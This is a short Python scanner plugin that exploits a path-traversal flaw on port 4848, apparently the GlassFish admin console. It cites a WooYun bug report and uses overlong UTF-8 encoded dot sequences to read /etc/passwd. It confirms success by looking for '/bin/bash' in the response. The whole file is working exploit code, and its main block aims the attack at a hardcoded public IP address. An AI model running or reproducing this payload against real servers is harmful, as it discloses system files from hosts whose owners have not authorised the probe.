#!/usr/bin/env python
# refer:http://www.wooyun.org/bugs/wooyun-2010-0144595

import urlparse
def assign(service, arg):
    if service == "www":
        r = urlparse.urlparse(arg)
        return True, 'https://%s:4848/' %(r.netloc)

def audit(arg):
    payload = 'theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    code, head, res, errcode, _ = curl.curl2(arg + payload)
    if code == 200 and '/bin/bash' in res:
        security_hole(arg+payload)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'https://14.17.126.156/')[1])